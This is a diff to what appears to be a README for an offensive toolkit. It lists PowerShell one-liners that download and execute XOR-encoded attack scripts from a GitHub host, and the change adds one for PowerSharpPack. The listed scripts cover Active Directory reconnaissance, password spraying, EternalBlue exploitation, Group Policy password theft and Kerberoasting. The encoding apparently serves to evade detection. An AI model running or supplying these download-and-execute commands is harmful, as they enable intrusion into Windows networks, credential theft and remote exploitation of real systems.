@@ -5,6 +5,7 @@ Some encoded tools, credit to the OG authors for the scripts
 ```
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/tools/Invoke-ADRecon.ps1-xorencoded.ps1')
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/tools/Invoke-DomainPasswordSpray.ps1-xorencoded.ps1')
+IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/tools/PowerSharpPack.ps1-xorencoded.ps1')
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/tools/Invoke-EternalBlue.ps1-xorencoded.ps1')
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/tools/Invoke-GPPPassword.ps1-xorencoded.ps1')
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/tools/Invoke-Kerberoast.ps1-xorencoded.ps1')
